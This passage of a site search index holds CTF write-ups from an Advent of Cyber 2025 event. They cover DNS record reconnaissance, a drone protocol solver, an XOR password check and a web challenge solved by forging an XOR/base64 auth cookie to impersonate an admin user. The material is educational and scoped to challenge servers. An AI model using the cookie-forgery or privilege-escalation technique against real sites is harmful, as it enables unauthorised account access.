<pre><code>csd{1_L34rn3D_7h15_Fr0m_70m_5C077_84CK_1n_2020}\n</code></pre>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#root-cause-analysis","title":"Root Cause Analysis","text":"Stage Vulnerability TOTP Information leakage (serverTime + HMAC) WebAuthn Trusting client-supplied identity MFA Strong factor, weak implementation"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#mitigation","title":"Mitigation","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#totp","title":"TOTP","text":"<ul> <li>Don't leak HMAC / server time</li> <li>Use constant-time comparison</li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#webauthn","title":"WebAuthn","text":"<ul> <li>Ignore userHandle from client</li> <li>Determine user based on credential ID</li> <li>Validate relationships:credential \u2192 user</li> </ul> <p>northpole123</p> <p></p> <p></p> <p></p> <p></p> <p></p> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_17_Guide-My-Drone-Tonight/","title":"Guide My Drone Tonight","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_17_Guide-My-Drone-Tonight/#guide-my-drone-tonight","title":"Guide My Drone Tonight","text":"<p>category : Reverse engineering</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_17_Guide-My-Drone-Tonight/#description","title":"Description","text":"<p>The North Pole has managed to get access to the\u00a0Krampus Syndicate's\u00a0internal supply drones. Perhaps if you can guide one of the drones to a nearby location we control, they can take it in for further analysis (and you'll get a flag :p).</p> <p>They've hooked up the access point to this server, but you only get a short amount of time before the drone system detects something wrong and kicks you off the connection.\u00a0Access the endpoint @\u00a0<code>nc ctf.csd.lol 6969</code></p> <p>Unfortunately, the North Pole have no idea how the drones communicate. All they've recovered is this test client taken off of an old leaked code database. It's up to you to figure out how to recover these drones.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_17_Guide-My-Drone-Tonight/#attachments","title":"Attachments","text":"<p>client</p> <p>hint :</p> <ul> <li>If you send an invalid input to the server, you might be able to use the error messages to figure out what part was invalid.</li> <li>Someone with a red nose told me remote only has 1000 unique nodes...</li> </ul> <p>The server models drones as nodes in a graph:</p> <ul> <li>Nodes have neighbors (maximum \u00b11000 total nodes)</li> <li>Drones move between nodes via MOVE</li> <li>Flags only appear on specific nodes</li> </ul> <p>No shortcuts; you must explore the graph.</p> <p>Binary analysis:</p> <p>Each packet has an 8-byte header:</p> Offset Size Description 0x00 4 Magic <code>\"KMPS\"</code> 0x04 1 Version (1) 0x05 1 Message Type 0x06 2 Total Length (little-endian)"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_17_Guide-My-Drone-Tonight/#message-types","title":"Message Types","text":"<p>From the results of decompilation and traffic observation:</p> Type Name Fungsi 1 HELLO Handshake awal 2 STATE Ambil posisi drone &amp; neighbor 3 MOVE Pindah ke node lain 4 FLAG Cek apakah sudah di target <p>solver</p> <pre><code>#!/usr/bin/env python3\nimport socket, struct, time, random\n\nHOST=\"ctf.csd.lol\"\nPORT=6969\nMAGIC=b\"KMPS\"\nVER=1\n\ndef pkt(t, payload=b\"\"):\n    length = 8 + len(payload)\n    return MAGIC + bytes([VER, t]) + struct.pack(\"&lt;H\", length) + payload\n\ndef recv_exact(s,n):\n    b=b\"\"\n    while len(b)&lt;n:\n        c=s.recv(n-len(b))\n        if not c:\n            raise EOFError(\"closed\")\n        b+=c\n    return b\n\ndef connect():\n    s=socket.create_connection((HOST,PORT),timeout=5)\n    s.settimeout(5)\n    s.sendall(pkt(1))\n    recv_exact(s,0x10)\n    return s\n\ndef get_state(s):\n    s.sendall(pkt(2))\n    hdr = recv_exact(s,8)\n    length = struct.unpack(\"&lt;H\", hdr[6:8])[0]\n    payload = recv_exact(s,length-8)\n\n    token = struct.unpack(\"&lt;I\", payload[0:4])[0]\n    n     = struct.unpack(\"&lt;I\", payload[4:8])[0]\n    neigh = list(struct.unpack(\"&lt;\"+\"I\"*n, payload[8:8+n*4])) if n else []\n    return token, neigh\n\ndef move(s, token, nxt):\n    payload = struct.pack(\"&lt;II\", nxt, (nxt ^ token) &amp; 0xffffffff)\n    s.sendall(pkt(3, payload))\n    hdr = recv_exact(s,8)\n    recv_exact(s,4)  # new node id (ignored)\n    return\n\ndef get_flag(s):\n    s.sendall(pkt(4))\n    hdr = recv_exact(s,8)\n    length = struct.unpack(\"&lt;H\", hdr[6:8])[0]\n    payload = recv_exact(s,length-8)\n    if payload.startswith(b\"csd{\"):\n        return payload.split(b\"\\x00\")[0].decode()\n    return None\n\ndef solve_once():\n    s = connect()\n    visited = set()\n\n    try:\n        while True:\n            f = get_flag(s)\n            if f:\n                print(\"[+] FLAG:\", f)\n                return True\n\n            token, neigh = get_state(s)\n            random.shuffle(neigh)\n\n            moved = False\n            for nb in neigh:\n                edge = (token, nb)\n                if edge not in visited:\n                    visited.add(edge)\n                    move(s, token, nb)\n                    moved = True\n                    break\n\n            if not moved:\n                # dead-end \u2192 random hop (still valid neighbor)\n                if neigh:\n                    move(s, token, random.choice(neigh))\n                else:\n                    return False\n\n    except Exception:\n        return False\n    finally:\n        try: s.close()\n        except: pass\n\nif __name__ == \"__main__\":\n    for i in range(30):\n        print(f\"[*] Attempt {i+1}\")\n        if solve_once():\n            break\n        time.sleep(0.2)\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Downloads/cyberstudent/17 des] \n\u2514\u2500$ python3 solve.py \n[*] Attempt 1 \n[*] Attempt 2 \n[*] Attempt 3 \n[+] FLAG: csd{h00r4y_now_U_h4v3_a_dr0ne_army_5846a7b30c}\n</code></pre> <p>csd{h00r4y_now_U_h4v3_a_dr0ne_army_5846a7b30c}</p> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_1_The-Mission-Begins/","title":"The Mission Begins","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_1_The-Mission-Begins/#day-1-the-mission-begins","title":"day 1 The Mission Begins","text":"<p>category : cryptography</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_1_The-Mission-Begins/#description","title":"Description","text":"<p>A series of repeated authentication failures was detected against the\u00a0FTP\u00a0service. The traffic pattern matched known Krampus Syndicate infrastructure, indicating the beginning of their intrusion attempts. After a sustained burst of password guessing, one request finally succeeded.</p> <p>Your task is to examine the logs or packet capture, identify which account was\u00a0compromised, and determine the password used during the successful login.</p> <p>Submit your answer as:\u00a0<code>csd{username_password}</code></p> <p>Reminder: Answers are\u00a0case sensitive**</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_1_The-Mission-Begins/#attachments","title":"Attachments","text":"<p>ftpchal.pcap</p> <p></p> <p>csd{W3lc0m3_8aCK_70_adv3N7_2025}</p> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_2_The-First-Strike/","title":"The First Strike","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_2_The-First-Strike/#day-2-the-first-strike","title":"day 2 The First Strike","text":"<p>category : Forensics</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_2_The-First-Strike/#description","title":"Description","text":"<p>A series of repeated authentication failures was detected against the\u00a0FTP\u00a0service. The traffic pattern matched known Krampus Syndicate infrastructure, indicating the beginning of their intrusion attempts. After a sustained burst of password guessing, one request finally succeeded.</p> <p>Your task is to examine the logs or packet capture, identify which account was\u00a0compromised, and determine the password used during the successful login.</p> <p>Submit your answer as:\u00a0<code>csd{username_password}</code></p> <p>Reminder: Answers are\u00a0case sensitive**</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_2_The-First-Strike/#attachments","title":"Attachments","text":"<p>ftpchal.pcap</p> <p>Open the provided pcap, theres many ftp connections. Grep \u00a0<code>PASV</code>\u00a0 to find a valid login:</p> <p></p> <p>hint :</p> <ul> <li>Our Dark Web Elves suggest starting with packet inspection. A tool like Wireshark can help you review the pcap.</li> <li>Focus on the details. Filtering the Info column may reveal the moment the Syndicate got in.</li> </ul> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_3_Syndicate-Infrastructure/","title":"Syndicate Infrastructure","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_3_Syndicate-Infrastructure/#day-3-syndicate-infrastructure","title":"day 3 Syndicate Infrastructure","text":"<p>Syndicate Infrastructure</p> <p>Category : Miscellaneous</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_3_Syndicate-Infrastructure/#description","title":"Description","text":"<p>Our monitoring systems have flagged suspicious DNS activity originating from a domain registered by the KRAMPUS SYNDICATE. Initial analysis suggests they're using it to coordinate operations against crucial North Pole systems.</p> <p>The domain in question: <code>krampus.csd.lol</code></p> <p>We need you to perform a full DNS reconnaissance sweep. The Syndicate thinks they're clever, hiding their infrastructure in plain sight but they're wrong.</p> <p>Map their infrastructure. Find what they're hiding. Report back before they realize we're onto them.</p> <ul> <li>NPLD Threat Intelligence Division</li> </ul> <p>Note: All the information we need is in the DNS records. Dig deep.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_3_Syndicate-Infrastructure/#summary","title":"Summary","text":"<p>All the necessary information is hidden in the public DNS records. The domain is managed through Cloudflare (public AXFR/zone-transfer is likely blocked). By searching through NS/TXT/SPF/DMARC/SRV/DKIM, we found artifacts pointing to the exfil subdomain and eventually found a base64 string in the DKIM selector record <code>syndicate._domainkey.krampus.csd.lol</code>, which, when decoded, yields the CTF flag.</p> <p>Flag: <code>csd{dn5_m19HT_B3_K1ND4_W0NKy}</code></p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_3_Syndicate-Infrastructure/#step-by-step","title":"Step by step","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_3_Syndicate-Infrastructure/#1-check-authoritative-nameserversoa","title":"1. Check authoritative nameserver/SOA","text":"<pre><code>Resolve-DnsName -Name krampus.csd.lol -Type NS\n</code></pre> <p>Result (SOA): the zone is at Cloudflare(harmony.ns.cloudflare.com) - meaning public zone transfer is almost certainly blocked.</p> <p>Implications: AXFR rarely works; we must follow the instructions in the DNS records (TXT, SPF, SRV, DKIM, etc.) according to the challenge hint. </p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_3_Syndicate-Infrastructure/#2-check-mxspf","title":"2. Check MX/SPF","text":"<pre><code>Resolve-DnsName -Name krampus.csd.lol -Type TXT\n</code></pre> <p>Result TXT: <code>v=spf1 include:_spf.krampus.csd.lol -all</code></p> <pre><code>Resolve-DnsName -Name _spf.krampus.csd.lol -Type TXT\n</code></pre> <p>Result _spf: <code>v=spf1 ip4:203.0.113.0/24 ~all</code></p> <ul> <li>Note: <code>mail.krampus.csd.lol</code> pointing at <code>127.0.0.1</code> looks like red-herring or intentional misdirection.</li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_3_Syndicate-Infrastructure/#3-check-dmarc","title":"3. Check DMARC","text":"<pre><code>Resolve-DnsName -Name _dmarc.krampus.csd.lol -Type TXT\n</code></pre> <p>Result:</p> <pre><code>v=DMARC1; p=reject; rua=mailto:dmarc@krampus.csd.lol; ruf=mailto:forensics@ops.krampus.csd.lol; fo=1; adkim=s; aspf=s\n</code></pre> <ul> <li><code>ruf</code> pointing at <code>forensics@ops.krampus.csd.lol</code> suggests there is an ops subdomain worth checking out.</li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_3_Syndicate-Infrastructure/#4checkops-subdomain-hint-from-dmarc","title":"4<code>.Checkops</code> subdomain (hint from DMARC)","text":"<pre><code>Resolve-DnsName -Name ops.krampus.csd.lol -Type TXT\n</code></pre> <p>Result:</p> <pre><code>internal-services:\n_ldap._tcp.krampus.csd.lol\n_kerberos._tcp.krampus.csd.lol\n_metrics._tcp.krampus.csd.lol\n</code></pre> <ul> <li> <p><code>ops</code> contains a list of SRV services that we should query.</p> </li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_3_Syndicate-Infrastructure/#5-query-the-listed-srv-records","title":"5. Query the listed SRV records","text":"<pre><code>Resolve-DnsName -Name _ldap._tcp.krampus.csd.lol -Type SRV\n</code></pre> <p>Result: target = <code>dc01.krampus.csd.lol</code>, additional A = <code>203.0.113.1</code> (port 389)</p> <pre><code>Resolve-DnsName -Name _kerberos._tcp.krampus.csd.lol -Type SRV\n</code></pre> <p>Result: target = <code>dc01.krampus.csd.lol</code> (port 88)</p> <pre><code>Resolve-DnsName -Name _metrics._tcp.krampus.csd.lol -Type SRV\n</code></pre> <p>Result: target = <code>beacon.krampus.csd.lol</code>, additional A = <code>203.0.113.2</code> (port 443)</p> <ul> <li>Meaning: there is a host <code>dc01</code> and <code>beacon</code> on /24 203.0.113.0/24 (as per SPF include).</li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_3_Syndicate-Infrastructure/#6-check-txt-on-beacon-and-dc01","title":"6. Check TXT on <code>beacon</code> and <code>dc01</code>","text":"<pre><code>Resolve-DnsName -Name beacon.krampus.csd.lol -Type TXT\n</code></pre> <p>Result:</p> <pre><code>config=ZXhmaWwua3JhbXB1cy5jc2QubG9s==\n</code></pre> <ul> <li>It looks like Base64. We decode it:<ul> <li><code>ZXhmaWwua3JhbXB1cy5jc2QubG9s==</code> \u2192 <code>exfil.krampus.csd.lol</code></li> </ul> </li> </ul> <p>Interpretation: beacon stores a pointer (config) to exfil.krampus.csd.lol - indicating exfiltration target. </p> <p><code>dc01</code> does not return any useful TXT (SOA/response authority seen), so focus on <code>exfil</code>.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_3_Syndicate-Infrastructure/#7-check-subdomain-exfil","title":"7. Check subdomain <code>exfil</code>","text":"<pre><code>Resolve-DnsName -Name exfil.krampus.csd.lol -Type TXT\n</code></pre> <p>Result:</p> <pre><code>status=active; auth=dkim; selector=syndicate\n</code></pre> <ul> <li>Immediate information: exfil active, authentication via DKIM, DKIM selector named <code>syndicate</code> - means we should check <code>syndicate._domainkey.exfil.krampus.csd.lol</code> or possibly <code>syndicate._domainkey.krampus.csd.lol</code> (need to try both patterns).</li> <li>You tried both variants:<ul> <li><code>syndicate._domainkey.exfil.krampus.csd.lol</code> \u2192 nothing</li> <li><code>syndicate._domainkey.krampus.csd</code>.<code>lol</code> \u2192 exists and returns a DKIM TXT.</li> </ul> </li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_3_Syndicate-Infrastructure/#8-retrieve-dkim-selectorsyndicate_domainkeykrampuscsdlol","title":"8. Retrieve DKIM selector<code>(syndicate._domainkey.krampus.csd.lol</code>)","text":"<pre><code>Resolve-DnsName -Name syndicate._domainkey.krampus.csd.lol -Type TXT\n</code></pre> <p>Result (Strings part <code>p=</code> very important):</p> <pre><code>v=DKIM1; k=rsa; p=Y3Nke2RuNV9tMTlIVF9CM1...9LMU5ENF9XME5LeX0=\n</code></pre> <ul> <li><code>p=</code> field in DKIM contains the public key; here <code>p=</code> contains a base64 string that appears not to be a normal RSA public-key but a short string that is clearly disguised as a base64 payload.</li> </ul> <p>We merge the split parts (PowerShell splits the lines). Once merged, the base64 string is: </p> <pre><code>Y3Nke2RuNV9tMTlIVF9CM19LMU5ENF9XME5LeX0=\n</code></pre> <p>Decode base64:</p> <p></p><pre><code>Y3Nke2RuNV9tMTlIVF9CM19LMU5ENF9XME5LeX0=  --&gt;  csd{dn5_m19HT_B3_K1ND4_W0NKy}\n</code></pre> <p></p> <p>That's exactly the format of the <code>csd{...}</code> flag.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_3_Syndicate-Infrastructure/#analysis-reasoning","title":"Analysis / Reasoning","text":"<ol> <li>No subdomain bruteforce: we follow the existing records<code>(_dmarc</code> \u2192 points to <code>ops</code> \u2192 TXT lists services \u2192 SRV \u2192 hosts \u2192 TXT config \u2192 pointers \u2192 exfil \u2192 TXT \u2192 DKIM selector,). This is a logical path that utilizes inter-record relationships (DMARC \u2192 ops \u2192 SRV \u2192 beacon \u2192 exfil \u2192 DKIM).</li> <li>Use of base64: often CTFs hide flags in fields that usually contain base64 (e.g. TXT DKIM <code>p=</code> or TXT config). Decoding base64 is a natural step.</li> <li>Cloudflare: closed AXFR, so only public records are available; challenge is intentionally designed so that participants follow the instructions in the records, not brute force.</li> <li>Red-herrings: <code>mail.krampus.csd.lol</code> \u2192 <code>127.0.0.1</code> - this is clearly intended to mislead or indicate internal-only mail routing.</li> </ol>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_3_Syndicate-Infrastructure/#summarized","title":"summarized","text":"<ol> <li><code>krampus.csd.lol</code> NS: Cloudflare \u2192 AXFR likely failed.</li> <li><code>TXT krampus.csd.lol</code> \u2192 SPF include <code>_spf.krampus.csd.lol</code> \u2192 shows subnet <code>203.0.113.0/24</code>.</li> <li><code>_dmarc</code> \u2192 <code>ruf=forensics@ops.krampus.csd.lol</code> \u2192 check <code>ops</code>.</li> <li><code>ops</code> TXT \u2192 SRV list: <code>_ldap</code>, <code>_kerberos</code>, <code>_metrics</code>.</li> <li><code>_metrics</code> SRV \u2192 target <code>beacon.krampus.csd.lol</code> \u2192 <code>beacon</code> TXT <code>config=ZXh...==</code> \u2192 base64 \u2192 <code>exfil.krampus.csd.lol</code>.</li> <li><code>exfil</code> TXT \u2192 <code>status=active; auth=dkim; selector=syndicate</code>.</li> <li><code>syndicate._domainkey.krampus.csd.lol</code> TXT \u2192 <code>p=Y3Nk...=</code> \u2192 base64 decode \u2192 <code>csd{dn5_m19HT_B3_K1ND4_W0NKy}</code>.</li> <li>Flag found: <code>csd{dn5_m19HT_B3_K1ND4_W0NKy}</code></li> </ol> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_4_The-Elf%27s-Wager/","title":"The Elf's Wager","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_4_The-Elf%27s-Wager/#day-4-the-elfs-wager","title":"Day 4 The Elf's Wager","text":"<p>category : reverse engineering</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_4_The-Elf%27s-Wager/#description","title":"Description","text":"<p>The break room buzzes with energy when you walk in. A crowd of elves has gathered around Jingle McSnark's desk, where a holographic scoreboard floats above a plate of half-eaten gingerbread.</p> <p>\"Ah, the human!\" Jingle spins around, candy cane tucked behind one pointed ear. \"Perfect timing. We were just discussing how long it would take you to fail today's challenge.\"</p> <p>He gestures dramatically at his terminal, where green text scrolls across a black screen.</p> <p>\"Every week, I post a little puzzle for the SOC team. Keeps us sharp, you know? Last week, Snowdrift over there\" he points at a sheepish-looking elf \"took\u00a0three days\u00a0to crack my binary.\u00a0THREE. DAYS.\"</p> <p>Snowdrift mutters something about \"unfair obfuscation\" into his hot cocoa.</p> <p>\"But you,\" Jingle continues, leaning forward with a grin that's equal parts challenge and condescension, \"you're supposed to be some kind of\u00a0specialist, right? Santa's new secret weapon against the Krampus Syndicate?\"</p> <p>He slides a USB drive across the desk. It's shaped like a tiny Christmas tree.</p> <p>\"Prove it. My mainframe authentication module. Figure out what gets you in. No debuggers and I've made sure of that.\u00a0Static analysis only, human.\"</p> <p>The elves exchange glances. Someone starts a betting pool on a napkin.</p> <p>\"Oh, and one more thing,\" Jingle adds, spinning back to his monitors. \"The Syndicate's been probing our mainframe access systems all week. If you\u00a0can't\u00a0figure out how authentication works at the North Pole... well, let's hope they can't either.\"</p> <p>The room falls silent, waiting.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_4_The-Elf%27s-Wager/#attachments","title":"Attachments","text":"<p>day4</p> <p>Hint :</p> <ul> <li>.Jingle peers over your shoulder and sighs. \"You know, some gifts come wrapped. You just need the right touch to unwrap them.\u00a0XOR-dinary, really.\"</li> <li>.A sticky note appears on your monitor, written in Snowdrift's handwriting:</li> </ul> <pre><code>gifts[] ^ 0x42 = ?\n    - S\n</code></pre> <p>The binary is a 64-bit Linux ELF file that requests access code. Debugging is not allowed, so the analysis is performed statically.</p> <p>Our goal is to discover the input validation logic and derive the correct access code.</p> <p></p> <p></p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_4_The-Elf%27s-Wager/#verification-function-analysis","title":"Verification Function Analysis","text":"<p>The verification function (<code>check_password</code>) has the following logic (decompiled):</p> <pre><code>for (i =0; i &lt;23; i++) {\nif ((input[i] ^0x42) != table[i])\nreturn0;\n}\nreturn1;\n</code></pre> <p>This means:</p> <ul> <li>Each input character is XORed with <code>0x42</code>.</li> <li>The result is compared against a static byte table in <code>.rodata</code>.</li> <li>If all 23 bytes match, access is granted.</li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_4_The-Elf%27s-Wager/#analyzing-rodata","title":"Analyzing <code>.rodata</code>","text":"<p>Comparative table found in section <code>.rodata</code>:</p> <pre><code>21 31 26 39 73 2c 36 72 1d 36 2a\n71 1d 2f 76 73 2c 24 30 76 2f 71 3f\n</code></pre> <p>Solver</p> <pre><code>data = bytes.fromhex(\n    \"21 31 26 39 73 2c 36 72 1d 36 2a \"\n    \"71 1d 2f 76 73 2c 24 30 76 2f 71 3f\"\n)\n\nprint(bytes(b ^ 0x42 for b in data).decode())\n</code></pre> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_5_Kramazon/","title":"Kramazon","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_5_Kramazon/#day-5-kramazon","title":"day 5 Kramazon","text":"<p>category : web exploit</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_5_Kramazon/#description","title":"Description","text":"<p>Intelligence analysts from the North Pole Logistics Directorate (NPLD) have uncovered a covert online storefront operated by the KRAMPUS Syndicate. Its name?\u00a0Kramazon.</p> <p>Looks familiar. Works familiar. Absolutely not legitimate.</p> <p>Kramazon is a distribution front used by the Syndicate to intercept gifts, reroute sleigh cargo, and quietly undermine Santa\u2019s global delivery network.</p> <p>NPLD Cyber Response believes Kramazon\u2019s checkout system contains a subtle implementation flaw: customers with ordinary elf-level accounts have somehow been able to receive Santa-priority shipping status, which should only be assigned through Santa\u2019s authenticated sleigh-routing systems.</p> <p>If KRAMPUS operators are abusing this flaw, they could divert or prioritize packages in ways that delay, disrupt, or even sabotage the entire Christmas Eve operation.</p> <p>Investigate Kramazon\u2019s ordering workflow. If you can exploit this flaw to obtain Santa Priority Delivery for your order, Kramazon will reveal its restricted Priority Route Manifest, which contains the flag.</p> <p>Good luck, Operative.</p> <p>https://kramazon.csd.lol/</p> <p>You are only allowed to test in the scope\u00a0<code>https://kramazon.csd.lol/*</code>.\u00a0Blind brute-force request sending (e.g. using tools like DirBuster) can trigger Cloudflare rate limits. Do not attempt to bypass Cloudflare limits. Therefore, if you wish to brute-force, please limit your wordlists or attack scope.</p> <p>clue :</p> <ul> <li>The challenge description states that regular users were able to somehow identify as the privileged Santa user. Use your browser DevTools and carefully review all requests and responses in the \"Network\" tab to see if anything is relevant. Additionally, reading over the\u00a0<code>script.js</code>\u00a0file that is being run will also be helpful. Remember, an HTTP response includes more than just the body.</li> <li>There is a\u00a0<code>Set-Cookie</code>\u00a0header being sent when you request the homepage. Perhaps the server is\u00a0not verifying\u00a0this part of the authentication flow properly. Using any clues that you can find in\u00a0<code>script.js</code>\u00a0(do any parts of the code look off?), can you reverse engineer the cookie and send one that can exploit the challenge?</li> </ul> <pre><code>#sript.js\ndocument.addEventListener(\"DOMContentLoaded\", function () {\n  // Hero Slider Logic\n  const slides = document.querySelectorAll(\".slide\");\n  const prevBtn = document.getElementById(\"prevBtn\");\n  const nextBtn = document.getElementById(\"nextBtn\");\n  let currentSlide = 0;\n  let slideInterval;\n\n  function showSlide(index) {\n    slides.forEach((slide, i) =&gt; {\n      slide.classList.remove(\"active\");\n      if (i === index) {\n        slide.classList.add(\"active\");\n      }\n    });\n  }\n\n  function nextSlide() {\n    currentSlide = (currentSlide + 1) % slides.length;\n    showSlide(currentSlide);\n  }\n\n  function prevSlide() {\n    currentSlide = (currentSlide - 1 + slides.length) % slides.length;\n    showSlide(currentSlide);\n  }\n\n  function startSlideShow() {\n    slideInterval = setInterval(nextSlide, 5000); // Change slide every 5 seconds\n  }\n\n  function stopSlideShow() {\n    clearInterval(slideInterval);\n  }\n\n  nextBtn.addEventListener(\"click\", () =&gt; {\n    nextSlide();\n    stopSlideShow();\n    startSlideShow();\n  });\n\n  prevBtn.addEventListener(\"click\", () =&gt; {\n    prevSlide();\n    stopSlideShow();\n    startSlideShow();\n  });\n\n  showSlide(currentSlide);\n  startSlideShow();\n\n  // Back to Top button\n  const backToTopBtn = document.getElementById(\"backToTopBtn\");\n  backToTopBtn.addEventListener(\"click\", () =&gt; {\n    window.scrollTo({\n      top: 0,\n      behavior: \"smooth\",\n    });\n  });\n});\n\n// :)\n(async () =&gt; {\n  const response = await fetch(\"https://ipapi.co/json/\");\n  const data = await response.json();\n\n  const locationElement = document.getElementById(\"location\");\n\n  locationElement.textContent = `${data.city}, ${data.postal}`;\n})();\n\ndocument.getElementById(\"order\").addEventListener(\"click\", async () =&gt; {\n  try {\n    console.log(\"Creating order...\");\n\n    const createRes = await fetch(\"/create-order\", {\n      method: \"POST\",\n      headers: { \"Content-Type\": \"application/json\" },\n    });\n    const order = await createRes.json();\n\n    console.log(\"[*] Waiting for status callback...\");\n    setTimeout(async () =&gt; {\n      const callbackRes = await fetch(order.callback_url);\n      const status = await callbackRes.json();\n\n      function santaMagic(n) {\n        return n ^ 0x37; // TODO: remove in production\n      }\n\n      if (status.internal.user === 1) {\n        alert(\"Welcome, Santa! Allowing priority finalize...\");\n      }\n\n      setTimeout(async () =&gt; {\n        const finalizeRes = await fetch(\"/finalize\", {\n          method: \"POST\",\n          headers: { \"Content-Type\": \"application/json\" },\n          body: JSON.stringify({\n            user: status.internal.user,\n            order: order.order_id,\n          }),\n        });\n\n        const finalize = await finalizeRes.json();\n        console.log(\"Finalize response:\", finalize);\n\n        alert(\"Order completed. Thank you for your support to Krampus Syndicate!\");\n      }, 1000);\n    }, 3000);\n  } catch (err) {\n    console.error(\"Error in workflow:\", err);\n  }\n});\n</code></pre> <p>on browser host</p> <p></p> <p>use cookie Bg%3D%3D</p> <p>response after click order now after change cookie on  kali vm browser</p> <p></p> <p>Kramazon is a fake storefront belonging to the KRAMPUS Syndicate that impersonates Amazon. Our task as Operative NPLD Cyber Response is to investigate a bug in its ordering system.</p> <p>The challenge description explains that:</p> <p>A regular user can somehow get Santa Priority Delivery, even though it should only be granted through a special Santa authentication system. </p> <p>In other words, there is a privilege escalation vulnerability through manipulation of the order flow, most likely in the cookie authentication.</p> <p>We are only allowed to test within the domain scope:</p> <p><code>https://kramazon.csd.lol/*</code></p> <p>No major brute-force attacks that violate Cloudflare's rate limits.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_5_Kramazon/#exploit-goal","title":"Exploit Goal","text":"<p>Make the backend system believe that we are Santa, so the order will be finalized as Santa Priority Delivery, and we will receive a Priority Route Manifest containing the flag.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_5_Kramazon/#recon-information-gathering","title":"Recon &amp; Information Gathering","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_5_Kramazon/#1-inspect-response-headers","title":"1. Inspect Response Headers","text":"<p>When accessing the <code>https://kramazon.csd.lol</code> homepage, using DevTools \u2192 Network, the main request (<code>GET /</code>) found the following header:</p> <pre><code>Cookie: auth=BA4FBg%3D%3D\n</code></pre> <p>Encode URL \u2192 decoded value:</p> <p><code>BA4FBg==</code></p> <p>This is likely a user token, and looks like base64.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_5_Kramazon/#2-review-client-side-logic-scriptjs","title":"2. Review Client-Side Logic (script.js)","text":"<p>In DevTools \u2192 Sources, the main script was found: <code>script.js</code>.</p> <p>The most suspicious one:</p> <pre><code>function santaMagic(n) {\nreturn n ^ 0x37; // TODO: remove in production\n}\n\nif (status.internal.user === 1) {\nalert(\"Welcome, Santa! Allowing priority finalize...\");\n}\n</code></pre> <p>This provides 2 important clues:</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_5_Kramazon/#clue-1-privilege-check","title":"Clue 1: Privilege check","text":"<p>Santa is identified as:</p> <pre><code>status.internal.user === 1\n</code></pre> <p>This means:</p> <ul> <li>Santa = user ID <code>1</code></li> <li>We just need to make <code>internal.user === 1</code></li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_5_Kramazon/#clue-2-obfuscation","title":"Clue 2: Obfuscation","text":"<p><code>santaMagic(n)</code> performs XOR:</p> <pre><code>user = cookie_value ^ 0x37\n</code></pre> <p>XOR is reversible:</p> <pre><code>cookie = user ^ 0x37\n</code></pre> <p>So the backend doesn't use signatures, HMAC, or signed JWTs, just XOR and base64.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_5_Kramazon/#decode-current-cookie","title":"Decode Current Cookie","text":"<p>In Console:</p> <pre><code>atob(\"BA4FBg==\")\n</code></pre> <p>The result is raw bytes, we XOR them:</p> <pre><code>const raw = atob(\"BA4FBg==\");\nlet decoded = \"\";\nfor (let i = 0; i &lt; raw.length; i++) {\ndecoded += String.fromCharCode(raw.charCodeAt(i) ^ 0x37);\n}\ndecoded;\n</code></pre> <p>Output:</p> <pre><code>\"3921\"\n</code></pre> <p>Meaning:</p> <ul> <li>Current User ID = 3921</li> <li>We are regular users, not Santa.</li> 